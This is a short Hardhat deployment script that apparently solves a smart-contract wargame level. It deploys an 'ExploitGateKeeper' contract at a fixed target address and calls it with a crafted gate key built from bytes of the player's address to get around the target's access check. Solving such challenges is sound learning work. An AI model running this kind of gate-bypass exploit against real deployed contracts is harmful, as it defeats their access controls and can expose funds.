import { ethers } from 'hardhat'
import { ExploitGateKeeper } from '../types/typechain/ExploitGateKeeper'

async function main() {
  const targetAddr = '0x67700be2e5042Ec53DABE721c751c8c4CaE795C6'

  const factory = await ethers.getContractFactory('ExploitGateKeeper')
  const exploit = (await factory.deploy(targetAddr)) as ExploitGateKeeper

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)
  console.log('Contract deployed, executing exploit...')

  // explanation for key in testfile for this level
  const gateKey = '0x' + '1000' + '0000' + '0000' + 'd2B5' //last 2 bytes player address
  await exploit.execute(gateKey)
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
